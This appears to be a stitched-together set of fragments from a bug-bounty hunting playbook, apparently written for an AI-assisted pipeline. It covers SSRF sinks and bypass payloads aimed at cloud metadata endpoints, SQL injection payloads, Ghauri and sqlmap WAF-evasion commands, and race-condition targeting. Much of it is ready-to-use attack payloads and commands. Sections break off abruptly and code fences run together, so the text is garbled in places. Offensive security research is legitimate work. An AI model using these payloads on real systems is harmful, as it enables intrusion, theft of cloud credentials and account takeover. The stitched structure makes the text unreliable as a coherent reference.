```
## Where SSRF sinks hide (discover)

- **Explicit URL params:** `?url=`, `?webhook=`, `?endpoint=`, `?redirect=`, `?callback=`, `?fetch=`, `?proxy=`, `?feed=`, `?import=`, `?source=`, `?path=`
- **JSON body fields:** `{"url":"..."}`, `{"hook":"..."}`, `{"target":"..."}`, `{"imageUrl":"..."}`, `{"pdfUrl":"..."}`
- **File import / document generators:** PDF/invoice generators, HTML-to-PDF, screenshot APIs, Markdown renderers — these fetch from a URL you supply. HIGH EV.
- **Webhook registration:** any endpoint that registers a callback URL; the server calls it back when an event fires.
- **XML body parsers:** `<!ENTITY>` XXE → SSRF (SSRFs the entity URL). Separate but often co-located.
- **GraphQL args:** `fetchUrl`, `imageUrl`, `avatarUrl`, `webhookUrl` fields on mutation args.
- **Image/avatar upload by URL:** "Import from URL" features — common in CMS and SaaS apps.

**Discovery:** jsintel `endpoints.jsonl` — grep for params above; ES `url_params` field; katana/gau archived params.

## Filter bypass catalog (2024–2026)

### 1. CIDR-blind string blocklists (confirmed working, multi-bounty)
Filters blocking `127.0.0.1` as a string match leave the entire `127.0.0.0/8` range open.
- `127.0.1.1`, `127.127.127.127`, `127.1.1.1` — all loopback, none blocked by a string compare
- `0.0.0.0` — resolves to loopback on many OS/HTTP-client combinations
- `0177.0.0.1` (octal), `2130706433` (decimal), `0x7f000001` (hex) — alternative representations
Source: https://herish.me/blog/five-bounties-one-ssrf-multiple-bypass-techniques/

### 2. IPv6-only hostname bypass (CVE-2026-27129, PHP/Guzzle — confirmed systematic class)
PHP's `gethostbyname()` returns the hostname string unchanged when the domain has only AAAA records (IPv6). A validator using `gethostbyname()` → IP blocklist comparison gets back the original string (not an IP), which passes all IP-based checks. Guzzle/curl then resolves the AAAA record and connects normally.

**Payload (AWS IMDS):** `http://fd00-ec2--254.sslip.io/latest/meta-data/`
(sslip.io maps `fd00-ec2--254` to `::fd00:ec2::254` → IPv6 of `169.254.169.254`)

**When to try:** any PHP app using URL/webhook input with SSRF protection. Confirmed on Craft CMS (CVE-2026-27129) and likely widespread in PHP stacks using `gethostbyname()`.
Source: https://github.com/craftcms/cms/security/advisories/GHSA-v2gc-rm6g-wrw9

### 3. Open redirect chaining (confirmed working)
Use a public redirect service to bounce through: validator sees an external URL (passes), the backend follows the redirect to the internal target.
- `http://307.r3dir.me/--to/?url=http://169.254.169.254/latest/meta-data/`
- Any `?url=` open redirect on a trusted domain the filter allows

Reaches AWS IMDS, internal APIs, etc. without directly mentioning the IP.

### 4. DNS rebinding TOCTOU (confirmed class, HackerOne #1369312)
Validator resolves the hostname (gets attacker's safe IP → passes). HTTP client re-resolves (DNS has TTL=0, now returns `169.254.169.254` → real request hits IMDS). Requires attacker-controlled DNS with sub-1s TTL. Tooling: `singularity.me` or a custom DNS server.
Source: https://hackerone.com/reports/1369312

### 5. URL-parser differentials (PortSwigger canonical)
Abuse the gap between the validator's URL parser and the backend HTTP client's parser:
- `https://expected-host:fakepassword@evil-host` — `@` causes the validator to parse `expected-host` as host; HTTP client correctly uses `evil-host`
- `https://evil-host#expected-host` — fragment trick; some validators read `expected-host` as the target
- Double URL encode: `%2527` in path; the filter decodes once (safe), the client decodes twice (controlled path)
- HTTP→HTTPS redirect trick: filter validates `http://evil.com` then the app follows a redirect to the actual internal target

### 6. Alternative IP encodings (quick checklist)
```
169.254.169.254          ← baseline
http://169.254.169.254/  ← trailing slash
http://[::ffff:169.254.169.254]/  ← IPv4-mapped IPv6
http://[fd00:ec2::254]/  ← AWS IMDS alternate IPv6
http://2852039166/       ← decimal IP
http://0xa9fea9fe/       ← hex IP
http://0251.0376.0251.0376/  ← octal
http://169.254.169.254.nip.io/  ← DNS wildcard

```sql
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT database())), 1)--
' AND EXP(~(SELECT * FROM (SELECT database())x))--
```
Returns data in the error message. Works when the PHP/app reflects raw DB errors.

```sql

' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5--
```

### Time-based blind
```sql
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--
```



## Injection surfaces beyond `?param=` (WAF-bypass angle)

### HTTP header injection
WAFs typically apply looser signatures to headers. Useful when the app logs them to a DB:
- `X-Forwarded-For: 1.1.1.1'`
- `User-Agent: Mozilla' AND SLEEP(5)--`
- `Referer: https://evil.com'`
- `X-Originating-IP: 127.0.0.1'`

Check: does the app use these in queries? Analytics tables, audit logs, rate-limit tables.

### JSON body injection
```json
{"search": "test'"}               ← basic trigger
{"filter": {"name": "test'"}}     ← nested object injection
{"id": "1 UNION SELECT 1,2,3--"}  ← UNION in JSON field
```
Modern ORMs with `.raw()` / `text()` escape hatches (Django, SQLAlchemy, Prisma) often pass these straight to the DB.

### ORM raw-query escape hatches (recon signal)
Every major ORM has an unsafe path:
- Django: `.raw("SELECT ... WHERE id = %s" % user_input)` — dangerous variant
- SQLAlchemy: `session.execute(text("... " + user_input))`
- Laravel: `DB::select("... $request->input")`
- Prisma: `prisma.$queryRaw`
**Hunting signal:** when error traces appear in responses, look for ORM-specific error messages. A `PG::SyntaxError`, `QueryError`, or `StatementInvalid` from a modern app stack often means a raw query.

## Ghauri — WAF-evasion alternative to sqlmap (confirmed June 2026)

When sqlmap's known signatures are blocked by a WAF (returns 403/406/captcha), **Ghauri** is the alternative. It has native tamper logic distinct from sqlmap's fingerprint and confirmed success in a June 2026 blind SQLi case where sqlmap failed entirely.

```bash
# Install
pip install ghauri

# Basic (same interface as sqlmap)
ghauri -u "https://HOST/path?param=FUZZ" --banner --current-db --current-user --dbs \
  --delay 1 --threads 1 --batch

# Time-based blind explicit
ghauri -u "https://HOST/path?param=FUZZ" --technique=T --dbs
```

**When to use:** sqlmap returns only 403s or WAF challenge pages after 5+ attempts → switch to Ghauri before giving up. Same rate-limit doctrine applies.

## WAF bypass technique stack (sqlmap tampers)

Single tampers are detected; **stacking 2-3** defeats most signature engines:

```bash
--tamper=space2comment,randomcase,charunicodeencode    # general
--tamper=between,greatest,space2comment                # comparison bypass
--tamper=apostrophemask,base64encode                   # quote bypass
--tamper=chardoubleencode,space2plus                   # encoding stack
```

Manual variants:
```sql
UN/**/ION SE/**/LECT      -- inline comment splitting
UNION%09SELECT            -- tab as space (URL-encoded)
UNiOn sElEcT              -- mixed case
%2555NION                 -- double URL encode: %25 = %, then 55 = U
```

## Second-order SQLi (stored injection)

Payload stored in one request, executed in a later query:
1. Register with username: `admin'--`
2. Change password: app builds `UPDATE users SET password=... WHERE username='admin'--'` → updates the admin account
3. Classic path: register → profile edit → export/report generation

Not in commodity scanner patterns — requires reasoning over the app's data flow (the AI-hunter lane).

## FP / not-a-finding patterns (don't report these)
- Error message without differential (error always fires = generic 500 = not SQL-specific)
- `'` triggers 500, `''` also triggers 500 (both break → parameter validation, not SQL injection)
- Reflected `'` in HTML without a DB error = likely XSS surface, not SQLi
- UNION SELECT returns 200 but same content as baseline (columns don't match / query produces no output)
- SLEEP(5) adds delay but app is slow anyway (establish baseline response time first)
- "SQL-like" strings in JS/API responses that are user-facing labels, not DB errors

```
### Last-byte sync — HTTP/1.1 fallback

When the target doesn't support HTTP/2: send all but the last byte of each parallel request, hold all connections open, then flush the final byte simultaneously. Achieves a narrower send window than independent requests. Turbo Intruder `gate` parameter implements this automatically.

### Target signal ranking (highest EV to lowest)

1. **Auth state race (highest payout, under-tested):** Concurrent "change email" + "confirm email change" to win a window where the new attacker email is confirmed before invalidation. Also: race password-reset token generation with account-state changes. Outcome = authentication bypass or account takeover. Often $5k–$25k+ range.

2. **Payment / balance limit overrun:** Concurrent coupon redeem, gift card application, withdrawal, checkout — the classic race. Heavily tested on large platforms (saturated), but fresh on niche apps and recently-launched features.

3. **One-time-token reuse:** `/verify`, `/confirm`, `/activate` with a single-use code. Race N redemptions before the "used" flag is written.

4. **Rate-limit bypass:** Concurrent requests to an endpoint with a per-request rate-limit. Batch=same as one request; HTTP/2 single-packet achieves the same effect structurally.

### Microservices / distributed race window (expanding 2025 surface)

Microservices introduce async inter-service gaps that don't exist in monoliths:
- Service A validates (synchronous)
- Service B writes state (async queue or separate HTTP call)
- The race window is the gap between A's validation response and B's write completing

**Signals:** flows spanning multiple round-trips (reserve inventory → charge payment → confirm order), event-driven pipelines, order flows using separate payment microservices. Harder to exploit reliably (network timing adds jitter between services), but also harder for devs to reason about = under-reported.

### Confirm primitive

Race conditions have no safe autonomous confirm — they require state-changing requests. Hard gate:
- **Operator-confirmed only:** send N requests manually, observe whether the state was applied multiple times (coupon deducted twice, balance negative, token reused).
- Tool: Turbo Intruder (Burp Pro) with HTTP/2 gate as above.
- NEVER autonomous in the pipeline — state changes affect real accounts.
```
